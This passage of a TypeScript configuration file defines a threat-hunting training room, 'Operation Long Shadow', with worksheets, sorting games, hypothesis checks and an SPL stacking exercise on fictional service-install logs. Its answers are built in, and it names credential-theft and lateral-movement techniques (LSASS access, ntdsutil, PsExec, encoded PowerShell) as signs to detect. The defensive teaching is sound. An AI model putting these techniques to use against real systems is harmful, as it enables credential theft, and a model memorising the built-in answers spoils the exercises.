import type { RoomExperience } from "./types";

// "Operation Long Shadow" for the "threat-hunting-fundamentals" room.
// Script: docs/campaign/94-threat-hunting-fundamentals.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Alderney Semiconductors (fictional), not the graded tasks' corp.com records.
// Signature: A Hunt That Finds Nothing Is Still a Result. An SPL ladder built from a written
// hypothesis, where stacking and rare values do the finding and every rare value turns out to
// have a change ticket, so the hypothesis is refuted and the map gets smaller. Then a tune that
// decides when a hunt has earned the right to become a detection.
// Game mix: hunt + outbreak + tune.
//
// Task order changed. New: r1, r2, q1, q2 | r3, q4 | q5, q3 | la1, flag1.
// Original: r1, r2, r3, q1, q2, q3, la1, flag1, q4, q5.
// r3 now sits with the stacking question that needs it, q5 with the beacon labs, q3 after the
// finding it asks about, and la1 + flag1 close the room as the boss. flag1 still follows la1
// directly, so its "log analysis event above" still holds. There is no "Log Analysis N" wording.
//
// Lab data differs from the graded tasks. Dwell times are a sector case list with its own numbers
// and an ambulance example in the primer, never the industry figures (q1). The pyramid uses
// ntdsutil, archiving and remote-admin behaviour, never LSASS (q2). The stack is services by file
// path, never parent and child pairs, and the parent lab pairs web shell, SQL, spreadsheet macro,
// HTA and Java, never a word processor (q4). The beacon sleeps 900 s with 1,204-byte check-ins,
// and no lab shows a burst or a large timed upload (q5). The hand-off example is a web shell on a
// public server (q3). The record is createdump dumping a vault client by PID, launched by
// PowerShell under WMI: never rundll32 with comsvcs, LSASS, cmd.exe or LAPTOP-JSMITH (la1, flag1).

export const THREAT_HUNTING_FUNDAMENTALS: RoomExperience = {
  roomId: "threat-hunting-fundamentals",
  codename: "Operation Long Shadow",
  theme: "longshadow",
  handler: { name: "Theresa Mwangi", role: "Threat Hunt Lead, Alderney Semiconductors" },
  briefing: [
    "Alderney Semiconductors. A chip design house, eight design servers, and nineteen days until the Kestrel layout goes to the foundry.",
    "A sector report says a group called Glass Heron sat inside two other chip designers for months. Neither firm had a single alert.",
    "Alderney has no alerts either, and Theresa Mwangi does not find that comforting. Quiet is not the same as clean.",
    "Write a hypothesis that can fail, hunt it, accept what the data says, and find out how long the shadow really is.",
  ],
  mission: "Read a dwell-time chart honestly, write a hypothesis that can fail, climb an SPL stack to the rare end, call what a null result means, read a beacon's rhythm, contain a confirmed finding, decide when a hunt earns an alert, then walk one record up the process tree.",
  estimate: "~55 min",
  look: { primary: "#b4bdf9", secondary: "#ffb07c", warn: "#ff4f6e" },
  scene: "facilitylongshadow",
  layout: "facility",
  stations: [
    {
      id: "hypothesis",
      label: "The Hypothesis",
      topic: "Reactive vs proactive · dwell time · the Hunting Maturity Model · the Pyramid of Pain · hypotheses · the Hunt Cycle",
      tagline: "Write down what would prove you wrong",
      building: "archive",
      taskIds: ["threat-hunt-r1", "threat-hunt-r2", "threat-hunt-q1", "threat-hunt-q2"],
    },
    {
      id: "stack",
      label: "The Stack",
      topic: "Hunting specific TTPs · which log holds what · stacking · rare values · what a null result means",
      tagline: "Count everything, then start at the bottom",
      building: "lab",
      taskIds: ["threat-hunt-r3", "threat-hunt-q4"],
    },
    {
      id: "rhythm",
      label: "The Rhythm",
      topic: "C2 beaconing · from hunt to detection · handing a finding to incident response",
      tagline: "When does a hunt earn an alert?",
      building: "control",
      taskIds: ["threat-hunt-q5", "threat-hunt-q3"],
    },
    {
      id: "longshadow",
      label: "The Long Shadow",
      topic: "Reading a confirmed hit: command lines, signed tools, the process tree",
      tagline: "One record, read all the way up",
      building: "vault",
      taskIds: ["threat-hunt-la1", "threat-hunt-flag1"],
      boss: true,
    },
  ],
  personas: {
    "threat-hunt-q1": { name: "Theresa Mwangi", role: "Threat Hunt Lead", line: "The board likes that chart. What do I say to them?" },
    "threat-hunt-q2": { name: "Theresa Mwangi", role: "Threat Hunt Lead", line: "They may be back, and you get one hunt. Where do you look?" },
    "threat-hunt-q4": { name: "Theresa Mwangi", role: "Threat Hunt Lead", line: "The counts are in. Which line do you start on?" },
    "threat-hunt-q5": { name: "Theresa Mwangi", role: "Threat Hunt Lead", line: "Four hosts, one hour. Which one do we open?" },
    "threat-hunt-q3": { name: "Theresa Mwangi", role: "Threat Hunt Lead", line: "It's real, and the machine is still on. What happens now?" },
    "threat-hunt-la1": { name: "Theresa Mwangi", role: "Threat Hunt Lead", line: "Read the record, field by field, before you tell me anything." },
    "threat-hunt-flag1": { name: "Theresa Mwangi", role: "Threat Hunt Lead", line: "One level up. Give me the name." },
  },
  briefings: {
    // ── Reading 1: why hunt, how mature, how high ──
    "threat-hunt-r1": [
      {
        kind: "worksheet",
        title: "Read the Dwell Times Yourself",
        prompt: "Monday, Alderney Semiconductors. Theresa Mwangi wants budget for a hunt, and the board has a chart saying the sector's median dwell time is down to nine days. Theresa slides the case list behind that chart across the table: work out what the one number leaves out.",
        caption: "Sector sharing group · 11 closed intrusions · last 12 months",
        columns: ["Case", "Sector", "How it came to light", "Dwell (days)"],
        rows: [
          ["S-01", "Chip packaging", "Ransom note on the file servers", "4"],
          ["S-02", "Test equipment", "Outsider told them: stolen designs on a forum", "236"],
          ["S-03", "Chip design", "Ransom note on the file servers", "7"],
          ["S-04", "Wafer supply", "Ransom note on the file servers", "3"],
          ["S-05", "Chip design", "Outsider told them: a partner saw odd logins", "190"],
          ["S-06", "Contract assembly", "Ransom note on the file servers", "9"],
          ["S-07", "Chip design", "Ransom note on the file servers", "5"],
          ["S-08", "Chip design", "Outsider told them: a law enforcement tip", "312"],
          ["S-09", "Test equipment", "Ransom note on the file servers", "11"],
          ["S-10", "Wafer supply", "Outsider told them: a rival's bid looked familiar", "143"],
          ["S-11", "Chip packaging", "Ransom note on the file servers", "6"],
        ],
        questions: [
          { id: "all", q: "Check the board's number. What is the median dwell time across all 11 cases, in days?", hint: "Sort the last column. With 11 values, the median is the 6th.", answer: ["9", "9 days"], why: "3, 4, 5, 6, 7, 9, 11, 143, 190, 236, 312. The sixth value is 9, so the chart is honest. Now ask what went into it." },
          { id: "note", q: "How many of the 11 cases came to light because the intruder announced itself?", hint: "Count the ransom notes.", answer: ["7", "seven"], why: "Seven of eleven ended with a note on the file servers. Nobody had to find those intruders. They stood up and said so." },
          { id: "quiet", q: "Now take only the cases an outsider had to report. What is their median dwell time, in days?", hint: "Four values, so average the middle two after sorting.", answer: ["213", "213 days"], why: "143, 190, 236, 312: the middle two average 213. Alderney's board sees 9. Glass Heron's two victims, S-05 and S-08, are in the row of numbers the chart never shows, and an intrusion like that has no ransom note to end it." },
        ],
        primer: {
          title: "Dwell time, and how to read a median",
          fold: true,
          points: [
            "**Dwell time** is the gap between first compromise and detection.",
            "**Reactive** work starts when a rule fires. **Proactive** work, threat hunting, starts from a question, whether or not any alert has fired.",
            "A **median** is the middle value of a sorted list. With an even count, average the middle two.",
            "A median is only as good as the list behind it, so ask what went into it before you trust it.",
          ],
          example: {
            label: "A worked read: a city's ambulance times",
            lines: [
              "The city reports a median wait of 8 minutes: 4, 5, 6, 7, 8, 9, 29, 31, 34.",
              "The first six calls are downtown, median 6.5. The last three are hill villages, median 31.",
              "The 8 is true, and it tells a hill village nothing about its own wait.",
            ],
          },
        },
      },
      {
        kind: "inspect",
        title: "Five Hunt Teams on the Maturity Ladder",
        prompt: "The board's next question is how good a hunt team is meant to be. HMM, the Hunting Maturity Model by David Bianco, rates how much hunting a team can do on its own, from HMM0 to HMM4. Theresa rates Alderney at HMM2. Open each peer team's notes and see where it lands.",
        artifact: "Peer review notes · five hunt programmes in the sector",
        items: [
          { id: "t3", text: "Stellis Logic writes its own hunt procedures for its own design farm, and invents new ways to analyse that data.", tag: "HMM3 Innovative", tone: "trust", note: "The step up from following recipes to writing them." },
          { id: "t0", text: "Kittiwake Foundry waits for the antivirus and the SIEM to speak, and keeps nine days of logs.", tag: "HMM0 Initial", tone: "warn", note: "Alert-driven, with little routine data. Evade the alerts and you are invisible here." },
          { id: "t4", text: "Tamarisk Devices writes its own procedures too, and each one that works becomes a scheduled rule by the next morning, so its hunters are free for the next idea.", tag: "HMM4 Leading", tone: "trust", note: "Everything at HMM3, plus automation. Hunters stop repeating what a machine can now do." },
          { id: "t1", text: "Pellham Optics pastes the IPs, domains and hashes from each vendor report into the SIEM search bar.", tag: "HMM1 Minimal", tone: "warn", note: "Still alert-driven, with indicator searches on top. This is the first limited form of hunting." },
          { id: "t2", text: "Corran Wafer keeps a year of data and runs the community's published hunt queries every week.", tag: "HMM2 Procedural", tone: "info", note: "Plenty of data, and procedures that other people created. Most programmes sit here, Alderney included." },
        ],
      },
      {
        kind: "sort",
        title: "Sort the Report by Attacker Pain",
        prompt: "The Glass Heron report lists what the group left behind at its last two victims. Theresa wants to know what will still work when the group comes back. Sort each item by how much it hurts them to replace it, using David Bianco's Pyramid of Pain.",
        buckets: [
          { id: "low", label: "Bottom: replaced in minutes" },
          { id: "mid", label: "Middle: a real nuisance, days or weeks" },
          { id: "high", label: "Top: how they work, slow and dear to replace" },
        ],
        items: [
          { id: "h", text: "The SHA-256 of the loader in the report's appendix", bucket: "low", why: "Recompile with one byte changed and the hash is new. It still matches last month's file, and nothing else." },
          { id: "ip", text: "Command server address 203.0.113.77", bucket: "low", why: "A rented server takes minutes to replace." },
          { id: "dom", text: "Domain cdn-fabtools.example", bucket: "low", why: "Another registration, another name. It costs them a few pounds and a coffee." },
          { id: "tool", text: "The custom tunnelling tool the group wrote for itself", bucket: "mid", why: "Losing a tool hurts. They must buy or write another and test it, and that takes real time. It still isn't how they think." },
          { id: "arc", text: "Their own file archiver, with its unusual command-line switches", bucket: "mid", why: "Detect the tool and they swap it for another archiver in a few days. The need to archive stays." },
          { id: "ntds", text: "Copying the domain database with ntdsutil to reach every password hash", bucket: "high", why: "New server, new loader, same need. To get every hash they must reach that database, so the behaviour keeps showing up whatever tools carry it." },
          { id: "split", text: "Splitting design files into 100 MB parts before sending them out", bucket: "high", why: "This is how they get big files past size limits. A new tool can do the splitting, and the pattern of many equal parts remains." },
          { id: "night", text: "Using an approved remote-admin tool to move between engineers' machines at night", bucket: "high", why: "It works because it looks like IT. Dropping it means building a whole new way of moving, and that is the top of the pyramid: tactics, techniques and procedures (TTPs)." },
        ],
        primer: {
          title: "The Pyramid of Pain",
          fold: true,
          points: [
            "The pyramid ranks what you can detect by how much pain it causes the attacker to change it.",
            "At the bottom sit hash values, IP addresses and domain names. In the middle sit their tools. At the top sit **TTPs**: tactics, techniques and procedures.",
            "A search for an indicator matches the past. A search for a behaviour goes on working when the tools change.",
            "Moving from indicators to behaviour is the biggest step a SOC team can take.",
          ],
          example: {
            label: "A worked read: a car-theft crew",
            lines: [
              "Number plate: swapped in minutes. List it and the crew fits another.",
              "The car: a few days to find a replacement.",
              "Their method, relaying the signal of a keyless fob: months to learn a new one.",
              "Police who watch for the method still catch the crew in the next car, on the next plate.",
            ],
          },
        },
      },
    ],
    // ── Reading 2: hypotheses and the Hunt Cycle ──
    "threat-hunt-r2": [
      {
        kind: "simulate",
        title: "Can This Hypothesis Fail?",
        prompt: "Theresa's rule: no query until the hypothesis is on paper. Five drafts came in from the team this morning. Run each one through the four checks. Only a draft that passes all four gets hunted, and the one that does goes straight into your next station.",
        checks: [
          { name: "Threat", question: "Does it name a technique or a class of attacker?" },
          { name: "Where", question: "Does it name the assets or the data source?" },
          { name: "Behaviour", question: "Does it say what you would expect to see?" },
          { name: "Can fail", question: "Could a search come back and prove it wrong?" },
        ],
        scenarios: [
          { id: "d1", label: "Draft 1", detail: "Glass Heron may be in the network, so we should look for anything suspicious.", results: ["pass", "fail", "fail", "fail"], why: ["Names a group, which is a start.", "The network is not a place you can query.", "'Anything suspicious' describes nothing.", "No result could ever disprove it."], verdict: "A worry, not a hypothesis. It gives you no idea when to stop." },
          { id: "d2", label: "Draft 2", detail: "Attackers use scheduled tasks for persistence.", results: ["pass", "fail", "fail", "fail"], why: ["A real technique.", "On which hosts? In which log?", "A fact about attackers says nothing about what you would see here.", "It is true whether Alderney is clean or not, so a search cannot touch it."], verdict: "True and useless. A hypothesis is a claim about your environment, not about the world." },
          { id: "d3", label: "Draft 3", detail: "Check the design server logs this quarter for bad activity.", results: ["fail", "pass", "fail", "fail"], why: ["No technique and no attacker.", "Design servers: clear.", "'Bad activity' is the thing you are meant to define.", "Nothing here to be proved wrong."], verdict: "A task, not a claim. Browsing logs without a direction is the failure the hypothesis exists to prevent." },
          { id: "d4", label: "Draft 4", detail: "Glass Heron is on the design servers. If we find nothing, that only shows how well it hides.", results: ["pass", "pass", "fail", "fail"], why: ["A named group.", "Design servers.", "It never says what the evidence would be.", "Finding something proves it, and finding nothing also proves it. That's the trap."], verdict: "Sounds bold, and it can't lose, which is exactly the problem. A claim no result can dent isn't a hypothesis, it's a belief." },
          { id: "d5", label: "Draft 5", detail: "H1: A group moving by PsExec-style remote services (T1021.002) would leave Event ID 7045 on our design servers. If it is here, I expect a service binary seen on very few servers, with no change ticket behind it.", results: ["pass", "pass", "pass", "pass"], why: ["A technique with its ATT&CK ID.", "Design servers, Windows System log.", "One rare binary with nobody's name on it.", "If every rare binary has a ticket, it's refuted, and you can say so."], verdict: "This one can lose. That's what makes it worth a morning: either result teaches you something, and you'll know which one you got." },
        ],
        primer: {
          title: "Three parts and one test",
          fold: true,
          points: [
            "A hunt **hypothesis** has three parts: the threat or technique, where the evidence would appear, and the behaviour you would expect to see.",
            "The test: it must be **falsifiable**. Some result has to be able to prove it wrong.",
            "Ideas come from threat reports, your own past incidents, MITRE ATT&CK, red team findings and unexplained spikes in the data.",
          ],
          example: {
            label: "A worked hypothesis: a hospital's records share",
            lines: [
              "Threat: a departing employee collecting patient letters.",
              "Where: file-server access logs for the records share.",
              "Behaviour: one account opening far more files than its own 30-day baseline during its notice period.",
              "How it fails: everyone on notice stays inside their baseline. Refuted, in writing.",
            ],
          },
        },
      },
      {
        kind: "sequence",
        title: "Run One Hunt Through the Cycle",
        prompt: "Theresa keeps the record of last spring's hunt on the desk as a model: HTA files reaching HR laptops. The pages have been shuffled. Put the hunt back in the order it ran, from first idea to the thing that outlived it.",
        items: [
          { id: "c", text: "Write the search in SPL for the process field in question", note: "Query language comes third. It depends on the platform, and the thinking is already done." },
          { id: "v", text: "Build the confirmed pattern into a rule that fires with nobody at the keyboard", note: "The step that outlives the hunt. Next time the SOC gets an alert, and the hunter gets a new question." },
          { id: "f", text: "Write the claim: 'If HTA files reach HR, mshta.exe will start from a browser's download folder on HR laptops'", note: "Everything starts with a claim that could turn out wrong." },
          { id: "a", text: "Make the call on what came back: confirmed, denied or inconclusive", note: "A hunt has three possible results, and a result needs an honest name." },
          { id: "i", text: "Pick the source: 30 days of EDR process events from the HR group", note: "EDR is endpoint detection and response. Decide where the evidence would live before you write a line of query." },
          { id: "d", text: "Record the query, the hosts, the window and the call, whatever the call was", note: "A negative result only helps the next hunter if it's written down." },
          { id: "e", text: "Run it across the HR laptops and collect what returns", note: "Running the query is the shortest step in the cycle." },
        ],
        order: ["f", "i", "c", "e", "a", "d", "v"],
        doneNote: "Formulate, identify the data, create the query, execute, analyse, document, convert. A confirmed finding is also a live incident, and the room comes back to that.",
        primer: {
          title: "A hunt is an experiment",
          fold: true,
          points: [
            "The cycle has seven steps, and it starts with a claim, not with a query.",
            "Every hunt ends in one of three calls: **confirmed**, **denied** or **inconclusive**.",
            "The record matters on all three, so nobody has to repeat the work and you can show what you covered.",
          ],
          example: {
            label: "A worked record: a denied hunt",
            lines: [
              "Claim: an intruder would add accounts to a local admin group on kiosk PCs.",
              "Source and window: Event ID 4732, 30 days, all 60 kiosks reporting.",
              "Call: denied. Every group change matched a build ticket.",
              "Worth having: kiosks are off the list until something changes.",
            ],
          },
        },
      },
    ],
    // ── Reading 3: techniques, the stack, and the null result ──
    "threat-hunt-r3": [
      {
        kind: "reactor",
        title: "Route Each Sign to the Log That Holds It",
        prompt: "Before Theresa lets you near the console: a hypothesis is worthless if you search the wrong log. Each sign below comes from one of four techniques the Glass Heron report mentions. Send it to the log where it would actually be recorded.",
        reactors: [
          { id: "edr", label: "EDR process events", sub: "What ran, its command line, who started it" },
          { id: "block", label: "PowerShell Event ID 4104", sub: "Script block logging" },
          { id: "proxy", label: "Web proxy logs", sub: "Outbound HTTP and HTTPS requests" },
          { id: "sys", label: "Windows System log", sub: "Event ID 7045, new service" },
        ],
        items: [
          { id: "i1", text: "PSEXESVC.exe installed as a service on a server", reactor: "sys", why: "PsExec copies a service binary over SMB and starts it, so T1021.002 leaves a 7045 on the target." },
          { id: "i2", text: "A service with a random eight-letter name, installed and gone within a minute", reactor: "sys", why: "Event ID 7045 fires on install, however short the service's life. The log keeps what the host no longer shows." },
          { id: "i3", text: "powershell.exe started with -EncodedCommand", reactor: "edr", why: "The switch sits on the command line, so it's in process telemetry. The real command inside is still hidden from this log." },
          { id: "i4", text: "A process reaching into LSASS memory", reactor: "edr", why: "LSASS, the Local Security Authority process, holds credential material in memory. Only a sensor on the host sees one process touching another." },
          { id: "i5", text: "A download cradle, readable after the script decoded itself", reactor: "block", why: "Event ID 4104 records the script as PowerShell is about to run it, so the encoding is gone. That's why this log beats the command line for T1059.001." },
          { id: "i6", text: "Obfuscated script text with Invoke-Expression in it", reactor: "block", why: "Script block logging captures the code itself, even when it was never on a command line or on disk." },
          { id: "i7", text: "Requests to a domain registered last week", reactor: "proxy", why: "The proxy log carries the destination name. Domain age comes from enriching that name afterwards." },
          { id: "i8", text: "A short, odd User-Agent string on outbound web traffic", reactor: "proxy", why: "The User-Agent header is part of the request, so T1071.001 leaves it in the proxy log." },
        ],
        primer: {
          title: "Four techniques worth hunting",
          fold: true,
          points: [
            "**T1003.001**, credential dumping from LSASS memory, where Windows holds password hashes and Kerberos tickets.",
            "**T1059.001**, PowerShell execution. Script text that was hidden from the command line can still reach Event ID 4104.",
            "**T1071.001**, command and control (C2) over web traffic, which leaves its marks in the proxy.",
            "**T1021.002**, moving over SMB with tools like PsExec, which install a service on the target.",
          ],
          example: {
            label: "A worked route: a new Run key",
            lines: [
              "Sign: a value added under a Windows Run key.",
              "It lives in the registry, so neither proxy nor System log will hold it.",
              "Log: Sysmon Event ID 13, registry value set.",
            ],
          },
        },
      },
      {
        kind: "hunt",
        title: "The Stack Ladder: Count, Then Read the Rare End",
        prompt: "Draft 5 is the hunt. H1, as written: \"A group moving by PsExec-style remote services (T1021.002) would leave Event ID 7045 on our design servers. If it is here, I expect a service binary seen on very few servers, with no change ticket behind it.\" Build it in SPL (Search Processing Language, Splunk's query language). Every result is what that line really returns.",
        language: "SPL",
        console: "Search",
        start: "index=wineventlog EventCode=7045 earliest=-90d",
        goal: "the rare service binaries, each tested against H1",
        tables: [
          {
            name: "index=wineventlog EventCode=7045 earliest=-90d",
            note: "System log: one row per service install, last 90 days. All 8 design servers reported throughout.",
            columns: ["_time", "host", "EventCode", "Service_Name", "Service_File_Name", "Service_Account"],
            rows: [
              ["2026-08-11 10:14:22", "ASC-ENG-042", "7045", "VPNClientSvc", "C:\\Program Files\\VPNClient\\vpnsvc.exe", "NT AUTHORITY\\LocalService"],
              ["2026-08-11 10:15:03", "ASC-ENG-117", "7045", "VPNClientSvc", "C:\\Program Files\\VPNClient\\vpnsvc.exe", "NT AUTHORITY\\LocalService"],
              ["2026-08-11 10:16:47", "ASC-ENG-204", "7045", "VPNClientSvc", "C:\\Program Files\\VPNClient\\vpnsvc.exe", "NT AUTHORITY\\LocalService"],
              ["2026-08-18 01:02:10", "ASC-DSN-01", "7045", "SensorAgent", "C:\\Program Files\\SensorAgent\\sensorsvc.exe", "LocalSystem"],
              ["2026-08-18 01:02:44", "ASC-DSN-02", "7045", "SensorAgent", "C:\\Program Files\\SensorAgent\\sensorsvc.exe", "LocalSystem"],
              ["2026-08-18 01:03:12", "ASC-DSN-03", "7045", "SensorAgent", "C:\\Program Files\\SensorAgent\\sensorsvc.exe", "LocalSystem"],
              ["2026-08-18 01:03:51", "ASC-DSN-04", "7045", "SensorAgent", "C:\\Program Files\\SensorAgent\\sensorsvc.exe", "LocalSystem"],
              ["2026-08-18 01:04:27", "ASC-DSN-05", "7045", "SensorAgent", "C:\\Program Files\\SensorAgent\\sensorsvc.exe", "LocalSystem"],
              ["2026-08-18 01:04:58", "ASC-DSN-06", "7045", "SensorAgent", "C:\\Program Files\\SensorAgent\\sensorsvc.exe", "LocalSystem"],
              ["2026-08-18 01:05:33", "ASC-DSN-07", "7045", "SensorAgent", "C:\\Program Files\\SensorAgent\\sensorsvc.exe", "LocalSystem"],
              ["2026-08-18 01:06:09", "ASC-DSN-08", "7045", "SensorAgent", "C:\\Program Files\\SensorAgent\\sensorsvc.exe", "LocalSystem"],
              ["2026-09-02 02:30:15", "ASC-DSN-01", "7045", "BackupCourier", "C:\\Program Files\\BackupCourier\\bcagent.exe", "LocalSystem"],
              ["2026-09-02 02:30:41", "ASC-DSN-02", "7045", "BackupCourier", "C:\\Program Files\\BackupCourier\\bcagent.exe", "LocalSystem"],
              ["2026-09-02 02:31:08", "ASC-DSN-03", "7045", "BackupCourier", "C:\\Program Files\\BackupCourier\\bcagent.exe", "LocalSystem"],
              ["2026-09-02 02:31:37", "ASC-DSN-04", "7045", "BackupCourier", "C:\\Program Files\\BackupCourier\\bcagent.exe", "LocalSystem"],
              ["2026-09-02 02:32:02", "ASC-DSN-05", "7045", "BackupCourier", "C:\\Program Files\\BackupCourier\\bcagent.exe", "LocalSystem"],
              ["2026-09-02 02:32:29", "ASC-DSN-06", "7045", "BackupCourier", "C:\\Program Files\\BackupCourier\\bcagent.exe", "LocalSystem"],
              ["2026-09-02 02:32:55", "ASC-DSN-07", "7045", "BackupCourier", "C:\\Program Files\\BackupCourier\\bcagent.exe", "LocalSystem"],
              ["2026-09-02 02:33:21", "ASC-DSN-08", "7045", "BackupCourier", "C:\\Program Files\\BackupCourier\\bcagent.exe", "LocalSystem"],
              ["2026-09-10 11:40:06", "ASC-ENG-301", "7045", "PrintBridge", "C:\\Program Files\\PrintBridge\\pbsvc.exe", "LocalSystem"],
              ["2026-09-23 03:11:19", "ASC-DSN-01", "7045", "LayoutIndexer", "D:\\EDA\\indexer\\lxsvc.exe", "LocalSystem"],
              ["2026-09-23 03:11:48", "ASC-DSN-02", "7045", "LayoutIndexer", "D:\\EDA\\indexer\\lxsvc.exe", "LocalSystem"],
              ["2026-09-23 03:12:14", "ASC-DSN-03", "7045", "LayoutIndexer", "D:\\EDA\\indexer\\lxsvc.exe", "LocalSystem"],
              ["2026-09-23 03:12:45", "ASC-DSN-04", "7045", "LayoutIndexer", "D:\\EDA\\indexer\\lxsvc.exe", "LocalSystem"],
              ["2026-09-23 03:13:11", "ASC-DSN-05", "7045", "LayoutIndexer", "D:\\EDA\\indexer\\lxsvc.exe", "LocalSystem"],
              ["2026-09-23 03:13:40", "ASC-DSN-06", "7045", "LayoutIndexer", "D:\\EDA\\indexer\\lxsvc.exe", "LocalSystem"],
              ["2026-09-23 03:14:37", "ASC-DSN-08", "7045", "LayoutIndexer", "D:\\EDA\\indexer\\lxsvc.exe", "LocalSystem"],
              ["2026-09-24 09:20:52", "ASC-LIC-01", "7045", "LicenseBridge", "D:\\EDA\\licbridge\\licbridge.exe", "LocalSystem"],
              ["2026-09-29 23:05:11", "ASC-DSN-02", "7045", "LicenseBridge", "D:\\EDA\\licbridge\\licbridge.exe", "LocalSystem"],
              ["2026-09-29 23:09:42", "ASC-DSN-05", "7045", "LicenseBridge", "D:\\EDA\\licbridge\\licbridge.exe", "LocalSystem"],
              ["2026-10-06 22:41:17", "ASC-DSN-03", "7045", "PSEXESVC", "%SystemRoot%\\PSEXESVC.exe", "LocalSystem"],
              ["2026-10-14 21:12:50", "ASC-DSN-06", "7045", "SensorAgent", "C:\\Temp\\sensor-hotfix\\sensorsvc.exe", "LocalSystem"],
            ],
          },
          {
            name: "change_records.csv",
            note: "Lookup file: approved changes that install a service, with their change windows.",
            columns: ["service_path", "change_id", "approved_by", "window"],
            rows: [
              ["C:\\Program Files\\SensorAgent\\sensorsvc.exe", "CHG-20201", "n.okafor", "2026-08-18 01:00-02:00"],
              ["C:\\Program Files\\BackupCourier\\bcagent.exe", "CHG-20266", "r.adeyemi", "2026-09-02 02:00-03:00"],
              ["D:\\EDA\\indexer\\lxsvc.exe", "CHG-20340", "l.brandt", "2026-09-23 03:00-04:00"],
              ["D:\\EDA\\licbridge\\licbridge.exe", "CHG-20377", "l.brandt", "2026-09-29 23:00-23:59"],
              ["%SystemRoot%\\PSEXESVC.exe", "CHG-20418", "r.adeyemi", "2026-10-06 22:00-23:30"],
              ["C:\\Temp\\sensor-hotfix\\sensorsvc.exe", "CHG-20436", "n.okafor", "2026-10-14 21:00-22:00"],
            ],
          },
        ],
        rungs: [
          {
            id: "scope", ask: "Line 2: keep only what the hypothesis is about.",
            choices: [
              { id: "a", text: "| search Service_Name=PSEXESVC", why: "One row, and you've gone back to hunting a name. PsExec's -r switch renames the remote service, so this only proves that nobody left the default. H1 is about a behaviour on a set of hosts.", apply: { op: "where", col: "Service_Name", test: "ieq", value: "PSEXESVC" } },
              { id: "b", text: "| search Service_Account=LocalSystem", why: "Twenty-nine of 32 rows stay. Nearly every service runs as LocalSystem, so this filter removes almost nothing, and the workstations are still in your count.", apply: { op: "where", col: "Service_Account", test: "ieq", value: "LocalSystem" } },
              { id: "c", text: "| search host=ASC-DSN-*", right: true, why: "Twenty-seven rows, all from the design servers H1 named. Now the count compares like with like: a workstation agent in the same stack would only blur what's rare among servers.", apply: { op: "where", col: "host", test: "has", value: "ASC-DSN-" } },
            ],
          },
          {
            id: "stack", ask: "Line 3: stack the installs so a rare one can stand out.",
            choices: [
              { id: "a", text: "| stats count by host", why: "Eight rows, 2 to 4 installs each. That tells you how busy each server was, and nothing about which binaries are unusual.", apply: { op: "summarize", by: ["host"], as: "count" } },
              { id: "b", text: "| stats count by Service_Name", why: "Five rows, and one install just vanished. Look at SensorAgent: 9, on an 8-server group. A service name is free text, so a one-off binary that borrows a common name melts into the crowd.", apply: { op: "summarize", by: ["Service_Name"], as: "count" } },
              { id: "c", text: "| stats count by Service_File_Name", right: true, why: "Six rows, one per binary. The path is what actually ran, so nothing can hide behind a friendly name. Count equals hosts here because each server installed once. On messier data, use dc(host) instead.", apply: { op: "summarize", by: ["Service_File_Name"], as: "count" } },
            ],
          },
          {
            id: "rare", ask: "Line 4: go to the rare end. You don't know how many servers an intruder would touch.",
            choices: [
              { id: "a", text: "| where count>=7", why: "The three fleet-wide pushes. Good to know as baseline, and the opposite of what H1 expected.", apply: { op: "where", col: "count", test: "in", value: ["7", "8"] } },
              { id: "b", text: "| where count<=3", right: true, why: "Three rows: everything seen on three servers or fewer out of eight. Two of them look alarming at a glance. That's still a lead, not a verdict.", apply: { op: "where", col: "count", test: "in", value: ["1", "2", "3"] } },
              { id: "c", text: "| where count=1", why: "Two rows, and the binary on two servers is gone. An intruder on two hosts is no less interesting than one on a single host. A cut-off that tight is how a hunt misses.", apply: { op: "where", col: "count", test: "eq", value: "1" } },
            ],
          },
          {
            id: "test", ask: "Line 5: H1 says there would be no change ticket. Test that on every row.",
            choices: [
              { id: "a", text: "| lookup change_records.csv service_path AS Service_File_Name OUTPUT change_id approved_by window", right: true, why: "All three rare binaries have a ticket. The lookup matches on the path alone, and stats dropped _time, so one step stays manual: compare each install's raw _time with its ticket's window.", apply: { op: "join", table: "change_records.csv", left: "Service_File_Name", right: "service_path", hideKey: true } },
              { id: "b", text: "| search Service_File_Name=*PSEXESVC*", why: "One row: the one that already looks like your hypothesis. Checking only the line that agrees with you is confirmation bias in a search bar. Every rare value gets the same test.", apply: { op: "where", col: "Service_File_Name", test: "has", value: "PSEXESVC" } },
              { id: "c", text: "| table Service_File_Name", why: "The same three paths, one column fewer, nothing tested. A tidier screen isn't evidence.", apply: { op: "project", cols: ["Service_File_Name"] } },
            ],
          },
          {
            id: "record", ask: "Line 6: this result goes in the hunt record. Keep what a reader needs to trust it.",
            choices: [
              { id: "a", text: "| table Service_File_Name count", why: "The rare list with its proof removed. The next hunter would have to run all of this again to see why it was cleared.", apply: { op: "project", cols: ["Service_File_Name", "count"] } },
              { id: "b", text: "| table change_id", why: "Three ticket numbers and nothing to say what each one covers. A record has to stand up without you in the room.", apply: { op: "project", cols: ["change_id"] } },
              { id: "c", text: "| table Service_File_Name count change_id approved_by window", right: true, why: "What was rare, how rare, which ticket covers it, who approved it, and the window to compare with the raw install times.", apply: { op: "project", cols: ["Service_File_Name", "count", "change_id", "approved_by", "window"] } },
            ],
          },
        ],
        expect: 3,
        lesson: "Three rare values, three tickets, and one check the query can't do for you: compare each raw install time with its ticket's window. Here all of them fit, so H1 is refuted: no unexplained remote-service install on these 8 servers in these 90 days. Say it in those words, because the words are the result. That's a morning well spent. Theresa can cross a whole route off the map, and rare was only ever a place to start looking, never proof. Next hypothesis, smaller map.",
        primer: {
          title: "Stacking, and five lines of SPL",
          fold: true,
          points: [
            "**Stacking** means counting one field across the fleet, then reading from the rare end. Rare values are where a hunt starts.",
            "Rare is a lead, not a verdict. Each value still needs checking against tickets, owners or known software.",
            "`search` filters rows, `stats count by x` stacks, `where` keeps counts you choose, `lookup` adds columns from a file, `table` picks what to show.",
            "SPL is Splunk's language. KQL serves Microsoft Sentinel and Defender, EQL serves Elastic, and Sigma rules convert to all of them. The hypothesis matters more than the language.",
          ],
          example: {
            label: "A worked stack: autorun entries",
            lines: [
              "`index=edr sourcetype=autoruns | stats count by entry_path`",
              "`C:\\Program Files\\OfficeHub\\hub.exe` 611",
              "`C:\\Program Files\\VPNClient\\vpnui.exe` 598",
              "`C:\\Users\\Public\\rtk\\audio.exe` 2",
              "Start at the 2. If an owner can explain it, close the line. If nobody can, you have a lead.",
            ],
          },
        },
      },
      {
        kind: "sort",
